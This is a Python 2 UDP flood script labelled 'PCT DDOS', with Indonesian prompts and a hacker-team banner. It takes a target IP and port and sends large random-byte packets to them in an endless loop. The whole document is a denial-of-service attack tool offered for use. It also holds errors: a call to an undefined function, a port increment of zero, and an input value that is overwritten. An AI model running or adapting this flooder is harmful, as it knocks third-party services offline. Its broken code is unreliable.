import time 
import datetime 
import socket
import random
import sys 
import os 
import signal

os.system("clear") 
time = time.ctime(time.time()) 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(("8.8.8.8", 80))
    
def use():
      print""
      print" \033[93m[+]==============================================[+]"
      print"                  GUNAKAN TOOLS INI DENGAN BIJAK"
      print"                        SALAM MR D4PLU17"
      print"         [+]==============================================[+]"
      print""
      print"             \033[92m=================================================="
      print"                           \033[94m      PCT DDOS        \033[91m"
      print"             \033[96m--------------------------------------------------"
      print"             \033[91m   ~    \033[94mAuthor : MR D4PLU17     \033[91m"
      print"             \033[91m   ~    \033[94mIG     : febryan_ragil  \033[91m"
      print"             \033[91m   ~    \033[94mTeam   : Purwokerto Cyber Team\033[91m"
      print"             \033[96m--------------------------------------------------"
      print"             \033[92m=================================================="
      print""
      print""
      print"\033[96mIP ANDA:"
      print(sock.getsockname()[0])  
      print""  
     
      ip = raw_input ("\033[93mMasukkan Ip Target:") 
      port = input ("Masukkan port: ") 
      bytes = input ("Masukkan Jumlah/paket:") 

      bytes = random._urandom(30000)  
      sent = 0
 
      try:
          while True:        
                sock.sendto(bytes, (ip,port)) 
                port = port + 0 
                sent = sent + 1                
                print "\033[94mWaktu \033[91m%s \033[94mMenendang \033[91m%s \033[94mdengan port \033[91m%s \033[94mJumlah \033[91m%s"%(time, ip, port, sent)               
                if port == 64559:
                   port = 1
      except socket.error as e:
          cadangan()
          while True:
                  packet = sock.recv(4096)
                  if len(packet) == 0:
                     print "\033[91mTidak ada koneksi internet, Coba periksa koneksi internet anda"     
                     cadangan()
   
def keyboard_interrupt(signal,jendela):
    print "\033[92mBerhenti"
    sys.exit(0)
signal.signal(signal.SIGINT, keyboard_interrupt)

if __name__ == '__main__': 
       use()
